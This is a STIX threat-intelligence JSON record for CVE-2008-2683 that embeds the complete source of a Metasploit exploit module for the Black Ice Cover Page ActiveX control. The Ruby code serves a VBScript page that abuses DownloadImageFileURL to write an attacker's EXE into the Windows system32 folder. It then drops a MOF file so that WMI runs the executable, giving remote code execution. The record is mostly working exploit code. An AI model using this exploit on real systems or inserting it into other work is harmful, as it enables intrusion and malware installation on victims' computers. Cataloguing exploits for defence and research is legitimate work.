{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f986b69d-a399-42ae-83a1-f1fe88ed85cf",
    "created": "2024-08-14T16:40:55.377814Z",
    "modified": "2024-08-14T16:40:55.377818Z",
    "name": "Black Ice Cover Page ActiveX Control Arbitrary File Download",
    "description": " This module allows remote attackers to place arbitrary files on a users file system",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/blackice_downloadimagefileurl.rb",
            "external_id": "blackice_downloadimagefileurl.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2008-2683"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n  include Msf::Exploit::WbemExec\n\n  #include Msf::Exploit::Remote::BrowserAutopwn\n  #autopwn_info({\n  #  :os_name => OperatingSystems::Match::WINDOWS,\n  #  :ua_name    => HttpClients::IE,\n  #  :javascript => true,\n  #  :rank       => NormalRanking,\n  #  :classid    => \"{79956462-F148-497F-B247-DF35A095F80B}\",\n  #  :method     => \"DownloadImageFileURL\",\n  #})\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Black Ice Cover Page ActiveX Control Arbitrary File Download',\n      'Description'    => %q{\n          This module allows remote attackers to place arbitrary files on a users file system\n        by abusing the \"DownloadImageFileURL\" method in the Black Ice BIImgFrm.ocx ActiveX\n        Control (BIImgFrm.ocx 12.0.0.0).  Code execution can be achieved by first uploading the\n        payload to the remote machine, and then upload another mof file, which enables Windows\n        Management Instrumentation service to execute the binary. Please note that this module\n        currently only works for Windows before Vista.  Also, a similar issue is reported in\n        BIDIB.ocx (10.9.3.0) within the Barcode SDK.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'shinnai',  # original discovery\n          'mr_me <steventhomasseeley[at]gmail.com>',  # msf\n          'sinn3r'    # wbemexec tekniq\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2008-2683'],\n          [ 'OSVDB', '46007'],\n          [ 'BID', '29577'],\n          [ 'EDB', '5750' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Payload'        =>\n        {\n          'Space'           => 2048,\n          'StackAdjustment' => -3500,\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          #Windows before Vista\n          [ 'Automatic', { } ],\n        ],\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2008-06-05'))\n  end\n\n  def autofilter\n    false\n  end\n\n  def check_dependencies\n    use_zlib\n  end\n\n  def on_request_uri(cli, request)\n\n    if request.uri.match(/\\.EXE/)\n      print_status(\"Sending EXE payload...\")\n      send_response(cli, @payload, { 'Content-Type' => 'application/octet-stream' })\n      return\n    elsif request.uri.match(/\\.MOF/)\n      return if @mof_name == nil or @payload_name == nil\n      print_status(\"Generating mof\")\n      mof = generate_mof(@mof_name, @payload_name)\n      print_status(\"Sending MOF\")\n      send_response(cli, mof, {'Content-Type'=>'application/octet-stream'})\n      return\n    end\n\n    url =  \"http://\"\n    url += (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address(cli.peerhost) : datastore['SRVHOST']\n    url += \":\" + datastore['SRVPORT'].to_s + get_resource() + \"/\"\n\n    #VBScript variables\n    clsid                 = \"79956462-F148-497F-B247-DF35A095F80B\"\n    method                = \"DownloadImageFileURL\"\n    blackice              = rand_text_alpha(rand(100) + 1)           #BlackIce object ID\n    @payload_name         = rand_text_alpha(rand(10) + 1) + \".EXE\"   #Payload name\n    payload_vbs_url_name  = rand_text_alpha(5)                       #Payload's vbs var name\n    payload_vbs_lpath     = rand_text_alpha(6)                       #Payload's lpath var name\n    @mof_name             = rand_text_alpha(rand(10) + 1) + \".MOF\"   #MOF path on victim machine\n    mof_vbs_url_name      = rand_text_alpha(5)                       #MOF's vbs var name\n    mof_vbs_lpath         = rand_text_alpha(6)                       #MOF's lpath var name\n    sub_name              = rand_text_alpha(rand(10) + 1)            #Subroutine name\n\n    #Slow connection friendly: We will wait for 4 seconds before we try to execute our payload\n    #This delay seems necessary before calling mof, otherwise we end up interrupting downloading\n    #our payload\n    content = <<-EOS\n    <html>\n    <object classid='clsid:#{clsid}' id='#{blackice}' ></object>\n    <script language='vbscript'>\n    sub #{sub_name}\n    #{mof_vbs_url_name} = \"#{url}#{@mof_name}\"\n    #{mof_vbs_lpath} = \"C:\\\\WINDOWS\\\\system32\\\\wbem\\\\mof\\\\#{@mof_name}\"\n    #{blackice}.#{method} #{mof_vbs_url_name}, #{mof_vbs_lpath}\n    end sub\n\n    #{payload_vbs_url_name} = \"#{url}#{@payload_name}\"\n    #{payload_vbs_lpath} = \"C:\\\\WINDOWS\\\\system32\\\\#{@payload_name}\"\n    #{blackice}.#{method} #{payload_vbs_url_name}, #{payload_vbs_lpath}\n    setTimeout \"#{sub_name}()\", 4000\n    </script>\n    </html>\n    EOS\n\n    #Clear the extra tabs\n    content = content.gsub(/^ {4}/, '')\n\n    print_status(\"Sending exploit HTML\")\n    send_response_html(cli, content)\n    handler(cli)\n\n  end\n\n  def exploit\n    @payload = generate_payload_exe\n    super\n  end\nend\n",
    "x_mitre_contributors": [
        ""
    ],
    "x_mitre_disclosure_date": "2008-06-05",
    "x_mitre_platforms": [
        "win'"
    ]
}